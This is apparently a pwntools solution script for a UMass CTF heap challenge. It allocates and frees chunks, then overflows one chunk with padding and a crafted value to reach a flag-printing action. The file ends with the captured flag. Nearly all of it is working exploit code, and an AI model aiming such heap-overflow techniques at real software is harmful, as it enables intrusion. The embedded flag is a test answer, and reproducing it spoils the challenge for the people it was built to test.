from pwn import *

# exe = ELF('./a.out')
exe = ELF('./chall')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+863
        b *malloc
        b *realloc
        b *main+907
        continue
    """)
elif args.REMOTE:
    io = remote("mitigations-are-awesome.ctf.umasscybersec.org", 1337)

# malloc [0]
io.sendlineafter(b'action', b'1')
io.sendlineafter(b'size', str(0x20).encode())

# malloc [1]
io.sendlineafter(b'action', b'1')
io.sendlineafter(b'size', str(0x20).encode())

# malloc [2]
io.sendlineafter(b'action', b'1')
io.sendlineafter(b'size', str(0x20).encode())

# free [1]
io.sendlineafter(b'action', b'2')
io.sendlineafter(b'index', b'1')
io.sendlineafter(b'size', str(0x100).encode())

offset = 48

# edit [0] and overflow
io.sendlineafter(b'action', b'3')
io.sendlineafter(b'index', b'0')
io.sendlineafter(b'bytes', b'100')
io.sendlineafter(b'data', b'A' * offset + b'Ez W\x00')


# get flag
io.sendlineafter(b'action', b'4')

io.interactive()

# UMASS{$0m3on3!_g37z_4ng$ty_wh3n_ptr4c3_w0rkz!!!}